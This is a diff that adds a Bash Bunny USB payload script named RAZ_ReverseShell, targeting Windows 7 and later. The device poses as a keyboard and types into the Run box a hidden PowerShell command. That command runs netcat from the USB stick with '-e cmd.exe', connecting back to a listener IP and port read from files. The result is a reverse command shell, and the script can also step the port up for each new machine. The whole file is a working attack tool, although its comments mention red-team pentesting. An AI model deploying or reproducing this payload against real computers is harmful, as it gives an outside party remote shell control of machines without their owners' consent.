@@ -1,0 +1,81 @@
+#!/bin/bash
+#
+# Title:         RAZ_ReverseShell
+# Author:        RalphyZ
+# Version:       1.0
+# Target:        Windows 7+
+# Dependencies:  The following files must exist in the switch folder:
+#                nc.exe - Windows binary for netcat with the -e flag
+#                listener_port.txt - The Port number for the netcat listener
+#                listener_ip.txt - The IP Address for the netcat listener
+# 
+# Description:   Executes a netcat reverse cmd shell at a given IP and Port
+#                Intentionally, this script leaves a trace in the Run Box
+#
+# Colors:
+# | Status     | Color                         | Description                                      |
+# | ---------- | ------------------------------| ------------------------------------------------ |
+# | SETUP      | Magenta solid                 | Setting attack mode, getting the switch position | 
+# | FAIL1      | Red slow blink                | Could not find the listener_port.txt file        | 
+# | FAIL2      | Red fast blink                | Could not find the listener_ip.txt file          | 
+# | FAIL3      | Red very fast blink           | Could not find the nc.exe file                   | 
+# | SPECIAL    | Cyan inverted single blink    | Incrementing the port in listener_port.txt       | 
+# | ATTACK     | Yellow single blink           | Running the VBScript                             | 
+# | FINISH     | Green blink followed by SOLID | Script is finished                               | 
+
+# Magenta solid
+LED SETUP
+
+# Change this if you want to enable auto_increment of the netcat port
+# If true, the port number is increased by 1 everytime the script runs
+# This is good for Red Teams doing PenTesting on multiple computers
+auto_increment=false
+
+# Set attack mode to HID and Storage
+ATTACKMODE HID STORAGE
+
+# Get the switch position
+GET SWITCH_POSITION
+
+# Check for all the files - error if not found. If found, put into variables
+if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/listener_port.txt" ] ; then
+    LED FAIL1
+    exit 1
+else
+  my_port=`cat /root/udisk/payloads/${SWITCH_POSITION}/listener_port.txt`
+fi
+
+if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/listener_ip.txt" ] ; then
+    LED FAIL2
+    exit 1
+else
+    my_ip=`cat /root/udisk/payloads/${SWITCH_POSITION}/listener_ip.txt`
+fi
+
+if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/nc.exe" ] ; then
+    LED FAIL3
+    exit 1
+fi 
+
+# Start the attack - yellow single blink
+LED ATTACK
+
+# Execute the powershell command in the run box with the appropriate variables
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\nc.exe') -nv ${my_ip} ${my_port} -e cmd.exe\"
+QUACK ENTER
+
+
+# If auto_increment, then update the listener_port file
+if [ "$auto_increment" = true ] ; then   
+   LED SPECIAL
+   echo $((my_port + 1)) > /root/udisk/payloads/${SWITCH_POSITION}/listener_port.txt
+   
+   # Allow the write to sync to the USB
+   sleep 1
+fi
+
+# Green 1000ms VERYFAST blink followed by SOLID
+LED FINISH
+exit 0
